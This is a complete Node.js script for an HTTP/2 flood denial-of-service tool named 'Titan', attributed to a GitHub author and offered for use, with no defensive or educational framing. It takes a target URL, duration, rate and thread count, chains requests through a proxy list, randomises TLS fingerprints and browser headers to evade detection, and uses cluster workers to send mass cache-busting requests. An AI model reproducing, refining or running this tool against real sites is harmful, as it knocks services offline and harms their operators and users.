#!/usr/bin/env node
// ============================================================
// Titan HTTP/2 Flood v2.0 - TLS 1.3 + Proxy Chaining
// Author: github.com/thesystemowner
// Technique: HTTP/2 multiplexing, JA3 spoofing, cluster mode
// ============================================================

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const url = require('url');
const fs = require('fs');
const cluster = require('cluster');
const crypto = require('crypto');

const args = process.argv.slice(2);
if (args.length < 3) {
    console.log(`Usage: node titan-http2.js <url> <time> <rate> <threads> <proxyfile>`);
    process.exit(1);
}

const target = args[0];
const time = parseInt(args[1]);
const rate = parseInt(args[2]);
const threads = parseInt(args[3]) || 1;
const proxyFile = args[4] || 'proxy.txt';
const parsed = url.parse(target);

const UAs = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
];

const cplist = [
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
    'TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305',
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305',
];

const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha384',
    'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha256:rsa_pkcs1_sha384',
];

const curves = [
    'X25519:P-256:P-384:P-521',
    'P-256:X25519:P-384:P-521',
    'X25519:P-256:P-384',
];

let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(l => l.includes(':'));
} catch { }

function randStr(len) {
    return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}

function genUA() {
    return UAs[Math.floor(Math.random() * UAs.length)];
}

function genHeaders() {
    const ua = genUA();
    const h = {
        ':method': 'GET',
        ':authority': parsed.host,
        ':scheme': 'https',
        ':path': parsed.path + '?' + randStr(8) + '=' + randStr(12),
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://www.google.com/search?q=' + randStr(6),
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'dnt': '1',
    };
    if (ua.includes('Chrome')) {
        h['sec-ch-ua'] = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"';
        h['sec-ch-ua-mobile'] = '?0';
        h['sec-ch-ua-platform'] = '"Windows"';
    }
    return h;
}

function floodWorker() {
    const cipper = cplist[Math.floor(Math.random() * cplist.length)];
    const sigal = sigalgs[Math.floor(Math.random() * sigalgs.length)];
    const curve = curves[Math.floor(Math.random() * curves.length)];

    function doRequest() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)].split(':') : null;

        const doTLS = (socket) => {
            const tlsOpts = {
                host: parsed.host,
                servername: parsed.host,
                ciphers: cipper,
                sigalgs: sigal,
                ecdhCurve: curve,
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1'],
                socket: socket || undefined,
            };
            const tlsSock = tls.connect(443, parsed.host, tlsOpts, () => {
                const client = http2.connect('https://' + parsed.host, {
                    createConnection: () => tlsSock,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 4294967295,
                        initialWindowSize: 2147483647,
                        maxFrameSize: 16777215,
                        maxHeaderListSize: 4294967295,
                    },
                });
                client.on('error', () => { });
                client.on('connect', () => {
                    for (let i = 0; i < rate; i++) {
                        try {
                            const req = client.request(genHeaders());
                            req.on('response', () => req.close());
                            req.end();
                        } catch { }
                    }
                });
                client.on('close', () => {
                    tlsSock.destroy();
                    setTimeout(doRequest, 100);
                });
            });
            tlsSock.on('error', () => { });
            tlsSock.setKeepAlive(true, 5000);
        };

        if (proxy) {
            const conn = net.connect({ host: proxy[0], port: parseInt(proxy[1]) || 8080 }, () => {
                conn.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                conn.once('data', (data) => {
                    if (data.toString().includes('200')) {
                        doTLS(conn);
                    } else {
                        conn.destroy();
                        setTimeout(doRequest, 50);
                    }
                });
            });
            conn.on('error', () => setTimeout(doRequest, 50));
        } else {
            doTLS();
        }
    }

    setInterval(doRequest, 500);
}

if (cluster.isMaster) {
    console.log(`[+] Titan HTTP/2 Flood`);
    console.log(`[+] Author: github.com/thesystemowner`);
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${time}s`);
    console.log(`[+] Threads: ${threads}`);
    console.log(`[+] Proxies: ${proxies.length}`);

    for (let i = 0; i < threads; i++) cluster.fork();

    setTimeout(() => {
        console.log('[+] Attack finished');
        process.exit(0);
    }, time * 1000);
} else {
    floodWorker();
}